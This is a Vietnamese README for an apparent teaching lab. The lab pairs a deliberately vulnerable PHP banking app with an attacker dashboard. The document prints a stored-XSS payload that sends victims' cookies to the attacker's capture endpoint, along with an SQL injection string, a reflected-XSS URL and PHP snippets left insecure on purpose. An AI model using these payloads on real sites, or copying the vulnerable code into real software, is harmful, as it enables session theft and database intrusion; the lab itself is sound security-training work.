# XSS and SQL Injection Attack - Dự Án Demo

## 📋 Mục Đích Dự Án

Đây là một dự án giáo dục được thiết kế để thực hành và hiểu rõ hơn về hai loại lỗ hổng bảo mật phổ biến nhất:

1. **Cross-Site Scripting (XSS)** - Kỹ thuật tiêm mã JavaScript vào trang web
2. **SQL Injection** - Kỹ thuật tấn công cơ sở dữ liệu thông qua các truy vấn SQL độc hại

## ⚠️ Cảnh Báo Bảo Mật

**Dự án này chỉ được sử dụng cho mục đích giáo dục và đào tạo.** Không được sử dụng để tấn công các hệ thống không có quyền. Vui lòng tuân theo các quy định pháp luật địa phương.

## 🏗️ Cấu Trúc Dự Án

```
xss-and-sql-injection-attack/
├── vulnerable-bank/          # Ứng dụng Ngân hàng có lỗ hổng
│   ├── index.php            # Trang đăng nhập
│   ├── dashboard.php        # Bảng điều khiển người dùng
│   ├── profile.php          # Trang hồ sơ (XSS vulnerability)
│   ├── transfer.php         # Trang chuyển tiền (SQL Injection vulnerability)
│   ├── cards.php            # Quản lý thẻ ảo
│   ├── loans.php            # Quản lý khoản vay
│   ├── bills.php            # Quản lý hóa đơn
│   ├── db.php               # Kết nối cơ sở dữ liệu
│   ├── functions.php        # Các hàm hỗ trợ
│   ├── setup.sql            # Script khởi tạo cơ sở dữ liệu
│   ├── docker-compose.yml   # Cấu hình Docker
│   ├── Dockerfile           # Dockerfile cho ứng dụng
│   └── css/                 # Các file CSS
├── attacker/                # Ứng dụng Tấn công
│   ├── index.php            # Dashboard tấn công
│   ├── capture.php          # Capture dữ liệu bị đánh cắp
│   ├── get_logs.php         # Xem nhật ký tấn công
│   └── Dockerfile           # Dockerfile cho attacker app
└── README.md               # Tài liệu này
```

## 🚀 Yêu Cầu Hệ Thống

- **Docker** (phiên bản 20.10+)
- **Docker Compose** (phiên bản 1.29+)
- **Web browser** (Chrome, Firefox, Safari, Edge)

## 📦 Cài Đặt và Chạy

### 1. Clone hoặc tải dự án

```bash
cd /path/to/xss-and-sql-injection-attack
```

### 2. Khởi động các container Docker

```bash
cd vulnerable-bank
docker-compose up
```

Lệnh này sẽ:
- Tải các image MySQL, PHP, PHPMyAdmin
- Khởi tạo cơ sở dữ liệu `vulnerable_bank`
- Chạy các ứng dụng web

### 3. Truy cập ứng dụng

Sau khi containers khởi động thành công, truy cập:

| Dịch vụ | URL | Tài khoản | Mật khẩu |
|---------|-----|----------|---------|
| Ngân hàng dễ bị tấn công | http://localhost:8080 | user1 | password123 |
| PHPMyAdmin | http://localhost:8081 | root | root |
| Dashboard Attacker | http://localhost:8082 | - | - |

## 🔑 Tài Khoản Mặc Định

Các tài khoản được tạo sẵn:

| Username | Password | Balance |
|----------|----------|---------|
| user1 | password123 | $5000 |
| user2 | password456 | $3000 |
| user3 | password789 | $2000 |

## 🎯 Các Loại Lỗ Hổng Có Thể Khai Thác

### 1. **Cross-Site Scripting (XSS) - Stored**

**Vị trí:** Trang Profile (`profile.php`)

**Cách khai thác:**
1. Đăng nhập vào tài khoản
2. Vào trang Profile
3. Nhập mã JavaScript vào trường "Bio":
   ```javascript
   <script>
   fetch('http://localhost:8082/capture.php?data=' + 
         encodeURIComponent(document.cookie))
   </script>
   ```
4. Khi người dùng khác xem profile, cookies sẽ bị gửi tới attacker

**Mục đích học tập:** Hiểu cách mã độc được lưu trữ và tái hiện

### 2. **SQL Injection**

**Vị trí:** Trang Chuyển tiền (`transfer.php`)

**Cách khai thác:**
1. Đăng nhập vào tài khoản
2. Vào trang Transfer Money
3. Nhập vào trường "To User ID":
   ```sql
   1 OR 1=1 --
   ```
4. Hệ thống sẽ hiện tất cả người dùng thay vì người dùng cụ thể

**Mục đích học tập:** Hiểu cách mã SQL không an toàn có thể bị khai thác

### 3. **XSS - Reflected**

**Vị trí:** Các tham số URL

**Cách khai thác:**
```
http://localhost:8080/dashboard.php?error=<script>alert('XSS')</script>
```

## 📊 Ứng Dụng Attacker

Dashboard Attacker (port 8082) hiển thị:
- Cookies bị đánh cắp từ các nạn nhân
- Dữ liệu được gửi qua XSS
- Nhật ký các tấn công thành công

## 🛠️ Cấu Trúc Cơ Sở Dữ Liệu

### Table: users
```sql
- id: INT (Primary Key)
- username: VARCHAR(50)
- password: VARCHAR(255)
- balance: DECIMAL(10,2)
- profile_bio: TEXT (XSS vulnerable)
```

### Table: transactions
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- type: ENUM('credit', 'debit')
- description: TEXT
- amount: DECIMAL(10,2)
- created_at: TIMESTAMP
```

### Table: virtual_cards
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- card_number: VARCHAR(16)
- expiry: VARCHAR(5)
- cvv: VARCHAR(3)
- balance: DECIMAL(10,2)
```

### Table: loans
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- amount: DECIMAL(10,2)
- status: ENUM('pending', 'approved', 'rejected')
- created_at: TIMESTAMP
```

### Table: bills
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- category: VARCHAR(50)
- biller: VARCHAR(100)
- amount: DECIMAL(10,2)
- status: ENUM('pending', 'paid')
```

## 🔍 Phân Tích Các Lỗ Hổng

### Vị trí Vulnerable Code:

**File: `vulnerable-bank/functions.php`**
```php
function get_user_data($conn, $user_id) {
    // VULNERABLE: Không sử dụng prepared statements
    $sql = "SELECT * FROM users WHERE id = $user_id";
    $result = $conn->query($sql);
    return $result->fetch_assoc();
}
```

**File: `vulnerable-bank/profile.php`**
```php
// VULNERABLE: XSS - hiển thị user input mà không escape
echo $user['profile_bio'];
```
